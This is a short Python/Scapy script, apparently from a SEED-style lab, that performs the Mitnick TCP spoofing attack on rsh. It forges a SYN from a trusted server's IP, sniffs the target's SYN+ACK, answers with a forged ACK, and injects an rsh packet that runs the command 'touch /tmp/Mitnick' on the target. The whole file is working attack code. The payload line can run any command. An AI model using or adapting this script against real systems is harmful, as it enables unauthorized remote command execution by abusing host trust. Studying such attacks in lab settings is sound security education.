#!usr/bin/python3
from scapy.all import *
import sys

X_ter_IP = "10.9.0.5"
X_ter_port = 514

T_ser_IP = "10.9.0.6"
T_ser_port = 1023

def spoof_pkt(pkt):
	sequence_no = 778933536 + 1
	old_ip = pkt[IP]
	old_tcp = pkt[TCP]

	tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4
	print("{}:{} -> {}:{} Flags={} Len={}".format(old_ip.src, old_tcp.sport,
		old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))

	if old_tcp.flags == "SA":
		print("Sending Spoofed ACK Packet in response to SYN + ACK...")
		IP_layer = IP(src=T_ser_IP, dst=X_ter_IP)
		TCP_layer = TCP(sport=T_ser_port,dport=X_ter_port,flags="A",
		 seq=sequence_no, ack= old_ip.seq + 1)
		pkt = IP_layer/TCP_layer
		send(pkt,verbose=0)

		# After sending ACK packet
		print("Sending Spoofed RSH Data Packet ...")
		data = '9090\x00seed\x00seed\x00touch /tmp/Mitnick\x00'
		pkt = IP_layer/TCP_layer/data
		send(pkt,verbose=0)

def spoof():
	print("Sending Spoofed SYN Packet ...")
	IP_layer = IP(src="10.9.0.6", dst="10.9.0.5")
	TCP_layer = TCP(sport=1023,dport=514,flags="S", seq=778933536)
	pkt = IP_layer/TCP_layer
	send(pkt,verbose=0)

def main():
	spoof()
	pkt = sniff(filter="tcp and src host 10.9.0.5", prn=spoof_pkt)

if __name__ == "__main__":
	main()
